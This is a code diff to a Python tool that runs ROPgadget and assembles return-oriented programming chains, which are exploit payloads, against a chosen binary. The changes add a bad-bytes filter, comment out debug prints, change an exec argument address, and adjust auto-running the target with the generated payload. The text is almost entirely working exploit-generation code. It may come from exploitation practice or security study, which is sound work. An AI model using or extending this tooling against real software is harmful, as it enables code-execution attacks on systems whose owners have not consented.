@@ -9,7 +9,13 @@ import argparse
 def main(parser):
 
     # run ROPgadget tool to get useful rop gadgets
-    rop = subprocess.Popen(['ROPgadget', '--binary', '{}'.format(parser.binary), '--ropchain', '--silent'],
+    if parser.badbytes:
+        rop = subprocess.Popen(['ROPgadget', '--binary', '{}'.format(parser.binary), '--ropchain', '--silent', '--badbytes', '{}'.format(parser.badbytes)],
+                        stdout=subprocess.PIPE,
+                        universal_newlines=True,
+                        bufsize=0)
+    else:
+        rop = subprocess.Popen(['ROPgadget', '--binary', '{}'.format(parser.binary), '--ropchain', '--silent'],
                         stdout=subprocess.PIPE,
                         universal_newlines=True,
                         bufsize=0)
@@ -100,7 +106,7 @@ def main(parser):
 
     # check if .data contains null bytes
     addr_remove_null = list(rop_gadgets['stackAddr'][0]) 
-    print('addr: ', addr_remove_null, '\n')
+    # print('addr: ', addr_remove_null, '\n')
     if (addr_remove_null[-8] == '0' and addr_remove_null[-7] == '0'):
         addr_remove_null[-7] = '1'
     if (addr_remove_null[-6] == '0' and addr_remove_null[-5] == '0'):
@@ -111,7 +117,7 @@ def main(parser):
         addr_remove_null[-1] = '1'
     addr_remove_null = ''.join(addr_remove_null)
     rop_gadgets['stackAddr'] = (addr_remove_null, '@ .data')
-    print('addr after: ', addr_remove_null, '\n')
+    # print('addr after: ', addr_remove_null, '\n')
 
     pp.pprint(rop_gadgets)
 
@@ -328,7 +334,7 @@ def main(parser):
             p += addPadding(rop_gadgets['mov'][1], {})
             arg_pointer += 4
 
-            print('stack_pointer_before: ', stack_addr_pointer, '\n')
+            # print('stack_pointer_before: ', stack_addr_pointer, '\n')
             if j == arg_size - 1 and arg_correct_length != 0:
                 stack_addr_pointer += arg_correct_length
             else:
@@ -375,8 +381,10 @@ def main(parser):
     # NULL pointer
     p += pushNULLonAddress(shadow_stack_address + 4)
 
+    pp.pprint(arg_addresses)
+
     p += POPB
-    p += pack("<I", arg_addresses[exec])
+    p += pack("<I", STACKADDR)
     p += addPadding(rop_gadgets['popB'][1], {})
 
     p += POPC
@@ -398,6 +406,8 @@ def main(parser):
     if parser.print:
         print(p, '\n')
     elif parser.autorun:
+        if parser.binary[0] != '.':
+            parser.binary = './' + parser.binary
         run = subprocess.Popen(['{}'.format(parser.binary), '{}'.format(parser.output)],
                                     universal_newlines=True,
                                     bufsize=0)
@@ -421,7 +431,9 @@ if __name__ == '__main__':
     parser.add_argument('-p', '--print', required=False, action='store_true',
                         help='Only prints generated ROPchain without any padding')
     parser.add_argument('-d', '-data', '--data_addr', required=False, action='store', type=str,
-                        help='Manually set the writable data section in hex')
+                        help='Manually set the writable data section in hex, use 0xADDRESSS')
+    parser.add_argument('--badbytes', required=False, action='store',
+                        help='Rejects specific bytes in the gadget\'s address. Separate bytes with |')
     args = parser.parse_args()
 
     main(args)
